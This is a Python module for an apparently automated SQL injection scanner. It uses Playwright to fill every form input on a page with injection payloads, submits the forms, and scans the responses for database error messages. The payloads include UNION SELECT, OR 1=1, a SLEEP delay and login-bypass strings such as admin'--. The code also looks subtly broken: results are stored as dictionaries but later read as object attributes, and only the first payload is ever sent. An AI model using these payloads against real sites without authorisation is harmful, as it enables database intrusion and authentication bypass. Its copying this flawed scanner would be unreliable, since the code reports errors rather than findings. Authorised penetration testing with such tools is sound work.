"""
SQL Injection Penetration Testing Module - Simplified Version
"""

import re
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from playwright.sync_api import Page, Locator


@dataclass
class SQLPayload:
    name: str
    payload: str
    risk_level: str


@dataclass
class SQLResult:
    input_name: str
    payload: str
    is_vulnerable: bool
    response_snippet: str
    risk_level: str
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert SQLResult to dictionary for JSON serialization"""
        return {
            'input_name': self.input_name,
            'payload': self.payload,
            'is_vulnerable': self.is_vulnerable,
            'response_snippet': self.response_snippet,
            'risk_level': self.risk_level
        }


class SQLPentester:
    """SQL Injection Penetration Tester - Simplified"""
    
    def __init__(self):
        self.payloads = [
            SQLPayload("Basic Union", "' UNION SELECT 1,2,3--", "high"),
            SQLPayload("Boolean True", "' OR 1=1--", "medium"),
            SQLPayload("Boolean False", "' AND 1=2--", "medium"),
            SQLPayload("Time Delay", "' OR SLEEP(3)--", "high"),
            SQLPayload("Auth Bypass", "' OR '1'='1", "critical"),
            SQLPayload("Admin Bypass", "admin'--", "critical")
        ]
    
    def detect_sql_in_response(self, response_text: str, payload: str) -> Tuple[bool, str]:
        """Deteksi SQL injection dalam response"""
        # Cek error messages
        sql_errors = [
            r"mysql_fetch_array",
            r"ORA-01756",
            r"Microsoft OLE DB Provider",
            r"SQLServer JDBC Driver",
            r"PostgreSQL query failed",
            r"Warning: mysql_",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"SQL syntax.*MySQL",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wmysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version"
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, "SQL Error detected"
        
        # Cek apakah payload muncul dalam response
        if payload in response_text:
            return True, "Payload reflected"
        
        return False, ""
    
    def test_form_inputs(self, page: Page, form_locator: Locator) -> List[SQLResult]:
        """Test SQL injection pada form inputs"""
        results = []
        
        try:
            # Ambil semua input dalam form
            inputs = form_locator.locator('input[type="text"], input[type="password"], textarea').all()
            
            for input_elem in inputs:
                input_name = input_elem.get_attribute('name') or 'unnamed'
                
                # Test dengan payload pertama saja untuk menghindari looping
                payload_obj = self.payloads[0]  # Basic Union
                
                try:
                    input_elem.clear()
                    input_elem.fill(payload_obj.payload)
                    
                    # Submit form
                    submit_btn = form_locator.locator('input[type="submit"], button[type="submit"]').first
                    if submit_btn.count() > 0:
                        submit_btn.click()
                        page.wait_for_timeout(2000)
                    
                    # Ambil response
                    response_text = page.content()
                    
                    # Deteksi SQL injection
                    is_vulnerable, snippet = self.detect_sql_in_response(response_text, payload_obj.payload)
                    
                    result = SQLResult(
                        input_name=input_name,
                        payload=payload_obj.payload,
                        is_vulnerable=is_vulnerable,
                        response_snippet=snippet[:200] if snippet else "",
                        risk_level=payload_obj.risk_level
                    )
                    
                    results.append(result.to_dict())
                    
                except Exception as e:
                    print(f"Error testing {input_name}: {e}")
                    continue
        
        except Exception as e:
            print(f"Error in SQL form testing: {e}")
        
        return results
    
    def run_sql_test(self, page: Page, url: str) -> Dict[str, Any]:
        """Jalankan SQL injection test pada halaman"""
        results = {
            'url': url,
            'form_tests': [],
            'summary': {
                'total_tests': 0,
                'vulnerabilities_found': 0,
                'critical_vulnerabilities': 0
            }
        }
        
        try:
            page.goto(url)
            page.wait_for_load_state('networkidle')
            
            # Test semua form
            forms = page.locator('form').all()
            for form in forms:
                form_results = self.test_form_inputs(page, form)
                results['form_tests'].extend(form_results)
            
            # Calculate summary
            all_results = results['form_tests']
            results['summary']['total_tests'] = len(all_results)
            results['summary']['vulnerabilities_found'] = len([r for r in all_results if r.is_vulnerable])
            results['summary']['critical_vulnerabilities'] = len([r for r in all_results if r.is_vulnerable and r.risk_level == 'critical'])
        
        except Exception as e:
            results['error'] = str(e)
        
        return results